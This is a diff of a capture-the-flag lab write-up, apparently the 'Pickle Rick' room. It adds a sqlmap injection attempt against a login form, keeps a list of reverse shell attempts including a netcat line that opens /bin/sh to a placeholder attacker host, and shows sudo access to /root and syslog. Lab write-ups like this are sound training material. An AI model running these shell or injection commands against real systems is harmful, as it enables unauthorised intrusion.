@@ -92,6 +92,11 @@ I attempted a SQL injection attack on the login form, in hopes of potentially di
 ...
 ```
 
+```bash
+$ sqlmap -u http://<target>:[port] --data "username=random&password=random&sub=Login" --risk ... -- ... --batch
+... no signifcant results
+```
+
 The database used in the system seems to either not use an SQL-based database, or is simply not vulnerable to a SQL injection attack.
 
 I decided to focus my efforts back on the shell environment presented in the interface. To provide myself with a more stable shell experience, I tried to establish a remote shell environment through a few methods: reverse shell and SSH connection.
@@ -99,7 +104,7 @@ I decided to focus my efforts back on the shell environment presented in the int
 **Attempts to initiate a reverse shell**
 
 ```bash
-$ perl ...
+$ perl ... # perl
 $ ... # bash
 $ ... # python
 $ nc <attacker> [port] -e /bin/sh # netcat
@@ -145,7 +150,7 @@ $ sudo less /var/log/syslog
 
 **Finding the last and final ingredient**
 
-Well, turns out, the 3rd ingredient is not hidden within any log files, but simply in the `/root` directory.&#x20;
+Well, it turns out, the 3rd ingredient is not hidden within any log files, but simply in the `/root` directory.&#x20;
 
 ```bash
 $ sudo ls -la /root
